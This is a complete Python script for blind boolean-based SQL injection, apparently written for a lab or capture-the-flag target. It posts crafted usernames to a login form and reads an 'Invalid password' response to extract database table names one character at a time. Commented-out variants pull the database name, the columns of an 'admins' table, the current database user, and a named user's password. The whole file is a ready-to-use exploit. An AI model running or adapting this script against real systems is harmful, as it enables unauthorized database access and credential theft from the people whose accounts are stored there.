import argparse
import requests
import sys


CHAR_SET = ' 0123456789-abcdefghijklmnopqrstuvyzABCDEFGHIJKLMNOPQRSTUVQXYZ!$()_'


def enumerate(*, url):

    valid = ''
    while True:
        found = None
        for c in CHAR_SET:
            session = requests.Session()
            print(c, end='', flush=True, file=sys.stderr)
            # injection = f"aaa' OR DATABASE() LIKE '{valid}{c}%'; -- -"
            injection = f"a' UNION SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME NOT IN 'admins' AND TABLE_NAME LIKE '{valid}{c}%'; --"
            # injection = f"a' UNION SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'admins' AND COLUMN_NAME LIKE '{valid}{c}%'; --"
            # injection = f"a' UNION SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'admins' AND COLUMN_NAME NOT IN ('id', 'password', 'username') AND COLUMN_NAME LIKE '{valid}{c}%'; --"
            # injection = f"a' UNION SELECT 1 FROM admins WHERE username = 'jesusita' AND password LIKE BINARY '{valid}{c}%'; --" # kassie
            # injection = f"a' UNION SELECT 1 WHERE USER() LIKE '{valid}{c}%'; -- -" # kassie
            response = session.post(
                url=url,
                data={
                    'username': injection,
                    'password': 'letmein'
                },
                headers={'Connection': 'close'}
            )
            
            print('\b', end='', flush=True, file=sys.stderr)
            if response.status_code == 500:
                print(response.text)
                exit(1)

            if response.text.find('Invalid password') > -1:
                found = c
                break
        if found is not None:
            valid += found
            print(found, end='', flush=True, file=sys.stderr)
        else:
            break
    print('\n' + valid)


if __name__ == "__main__":
    parser = argparse.ArgumentParser('Enumerator')
    parser.add_argument(
        '--url',
        type=str, required=True, help='URL to process'
    )
    args = parser.parse_args()
    enumerate(**args.__dict__)
